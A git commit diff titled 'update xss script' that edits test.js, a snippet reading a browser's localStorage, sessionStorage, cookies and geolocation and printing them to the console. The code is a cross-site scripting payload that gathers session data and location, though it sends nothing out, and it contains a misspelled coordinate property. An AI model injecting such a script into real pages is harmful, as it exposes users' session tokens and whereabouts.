d7e5e70b93991ae1d5273fcdd5ad4f22a82cde83
dolby.xiaowen <githubxiaowen@gmail.com>
2016-09-01 11:18:59 +0800

    update xss script

--- test.js
+++ test.js
@@ -2,6 +2,6 @@ for (var i in window.localStorage){console.log('localStorage'+i+":",window.local
 for (var i in window.sessionStorage){console.log('sessionStorage'+i+":",window.sessionStorage.getItem(i));} 
 console.log('cookie:'+document.cookie);
 navigator.geolocation.getCurrentPosition(function(position){
-	console.log("positioncoords:"+position.coords);
+	console.log("positioncoords:"+position.coords.longtitude+position.coords.latitude);
 	console.log("positiontimestam:"+position.timestamp);
 })
